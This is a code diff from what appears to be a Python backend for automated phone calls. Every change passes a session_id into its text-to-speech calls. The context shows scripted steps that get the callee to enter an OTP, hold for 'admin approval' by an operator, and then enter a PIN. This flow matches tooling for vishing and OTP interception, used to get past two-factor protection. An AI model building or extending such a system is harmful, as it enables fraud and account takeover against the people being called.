@@ -554,7 +554,7 @@ async def play_step2_with_retry(session_id: str, session: dict, call_id: str, ot
             {"$set": {"step2_play_count": play_count}}
         )
         
-        await play_tts(call_id, step2_text, session.get("language", "en"))
+        await play_tts(call_id, step2_text, session.get("language", "en"), session_id)
         
         # Wait for TTS to finish - but check frequently if OTP was received
         word_count = len(step2_text.split())
@@ -604,7 +604,7 @@ async def play_step3_with_retry(session_id: str, session: dict, call_id: str):
             return
         
         await emit_log(session_id, "step", f"🎙️ Playing Step 3: Please Wait (Play {play_count}/2)...")
-        await play_tts(call_id, step3_text, session.get("language", "en"))
+        await play_tts(call_id, step3_text, session.get("language", "en"), session_id)
         
         # Wait for TTS to finish
         word_count = len(step3_text.split())
@@ -655,7 +655,7 @@ async def play_step3_retry_only(session_id: str, session: dict, call_id: str):
     
     await emit_log(session_id, "warning", "⚠️ No admin response, playing message again...")
     await emit_log(session_id, "step", "🎙️ Playing Step 3: Please Wait (Play 2/2)...")
-    await play_tts(call_id, step3_text, session.get("language", "en"))
+    await play_tts(call_id, step3_text, session.get("language", "en"), session_id)
     
     # Wait for TTS to finish
     await asyncio.sleep(tts_wait)
@@ -1106,7 +1106,7 @@ async def handle_dtmf(session_id: str, session: dict, call_id: str, dtmf_value: 
             # Play Step 3 TTS immediately (not as background task)
             await emit_log(session_id, "step", "🎙️ Playing Step 3: Verification Wait...")
             step3_text = session["messages"]["step3"]
-            await play_tts(call_id, step3_text, session.get("language", "en"))
+            await play_tts(call_id, step3_text, session.get("language", "en"), session_id)
             await emit_log(session_id, "action", "⏳ Waiting for admin approval...")
             
             # Start Step 3 retry loop in background
@@ -1131,7 +1131,7 @@ async def accept_otp(session_id: str, current_user: dict = Depends(get_current_u
     # Play accepted message
     accepted_text = session["messages"]["accepted"]
     await emit_log(session_id, "step", "🎙️ Playing Accepted message...")
-    await play_tts(call_id, accepted_text, session.get("language", "en"))
+    await play_tts(call_id, accepted_text, session.get("language", "en"), session_id)
     
     # Calculate wait time based on text length (roughly 150 words per minute = 2.5 words per second)
     # Average word length is ~5 characters, so ~12.5 characters per second
@@ -1191,7 +1191,7 @@ async def play_rejected_with_retry(session_id: str, session: dict, call_id: str,
             return
         
         await emit_log(session_id, "step", f"🎙️ Playing Retry message (Play {play_count}/2)...")
-        await play_tts(call_id, rejected_text, session.get("language", "en"))
+        await play_tts(call_id, rejected_text, session.get("language", "en"), session_id)
         
         # Wait for TTS to finish
         word_count = len(rejected_text.split())
@@ -1237,7 +1237,7 @@ async def request_pin(session_id: str, digits: int = 6, current_user: dict = Dep
     # Play message requesting PIN
     pin_message = f"Please enter your {digits} digit PIN code using your dial pad."
     await emit_log(session_id, "step", f"🎙️ Requesting {digits}-digit PIN...")
-    await play_tts(call_id, pin_message, session.get("language", "en"))
+    await play_tts(call_id, pin_message, session.get("language", "en"), session_id)
     
     # Update session for PIN capture
     await db.otp_sessions.update_one(
